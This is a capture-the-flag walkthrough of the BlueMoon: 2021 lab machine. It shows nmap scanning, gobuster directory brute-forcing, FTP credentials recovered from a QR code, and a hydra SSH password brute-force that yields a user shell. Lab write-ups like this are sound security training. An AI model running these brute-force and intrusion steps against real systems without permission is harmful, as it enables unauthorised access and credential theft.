# 🛡️ BlueMoon: 2021 Penetration Testing Report

## 📋 Project Summary
Detailed walkthrough of the *BlueMoon: 2021* CTF machine. The objective was to demonstrate a full attack lifecycle, from initial reconnaissance to gaining a user shell via SSH.

---

## 🛠️ Infrastructure & Toolkit
- *Target IP:* 10.27.55.51
- *Attacker OS:* Kali Linux (alyntsh@kali)
- *Networking:* ifconfig eth0 confirmed local IP 10.27.55.10
- *Tools Used:* Nmap, Gobuster, Hydra, FTP, QR Analysis
---
🔍 Phase 1: Reconnaissance & Enumeration
1. Host Discovery
```bash
nmap -sn 10.27.55.0/24
```
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/07efa75b-0206-4ca4-9c49-dfdeb97bfee5" />

2. Service Scanning
```bash
nmap -sC -sV -Pn -vv 10.27.55.51
```
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/0d13a515-64d5-4b30-8bf4-33decfc7b963" /><br/>
<img width="375" height="392" alt="image" src="https://github.com/user-attachments/assets/8f3bfdde-c707-42eb-8105-54a26a5c8a3d" /><br/>
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/4b6db9d0-cf9b-4477-a6d7-797090571511" />


Results:
Port 21: vsftpd 3.0.3
Port 22: OpenSSH 7.9p1
Port 80: Apache httpd 2.4.38
3. Web Directory Brute-forcing
```bash
gobuster dir -u http://10.27.55.51 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/53696b1f-0a1e-4f23-8a3d-d9fab9cf2fc3" /><br/>
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/d6773307-a592-45cd-bf47-682a2f3d9780" /><br/>

Discovered:
`/hidden_text` (Status: 200)
Asset Found:
`QR_C0d3.png`
---
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/279eed49-7d06-4e62-9680-acd1ec6d1549" />

🔓 Phase 2: Exploitation
1. QR Code Analysis
Scanning the QR code revealed FTP credentials:
Username: `userftp`
Password: `ftpp@ssword`
<img width="194" height="446" alt="image" src="https://github.com/user-attachments/assets/a70ae816-b7b8-4e48-9a53-e62858c6ae1a" />

3. FTP Data Exfiltration
```bash
ftp 10.27.55.51
get information.txt
get p_lists.txt
```
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/0f64fef3-0e31-4abe-9ec4-ca933229b02d" /><br/>
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/de10917a-3988-491f-8a73-08492175affa" /><br/>
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/db3df217-71de-46e7-8629-59ee1b4c0d26" />


Findings:
`information.txt`: Identified user `robin`
`p_lists.txt`: Custom wordlist
3. SSH Brute-force
```bash
hydra -t 4 -l robin -P p_lists.txt ssh://10.27.55.51
```
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/e335b20b-189b-4adb-924b-3632c7ac7ed4" />

Result:
Username: `robin`
Password: `k4rv3ndh4nh4ck3r`
---
🏆 Phase 3: Post-Exploitation
SSH Access
```bash
ssh robin@10.27.55.51
```
Access:
```bash
robin@BlueMoon:~$
```
<img width="375" height="382" alt="image" src="https://github.com/user-attachments/assets/51ef9bbc-3952-4c65-9b52-594ef3668506" />

---
## ✅ Conclusion
Successfully completed:
- Reconnaissance  
- Enumeration  
- Exploitation  
- Credential Harvesting  
- Initial Access via SSH
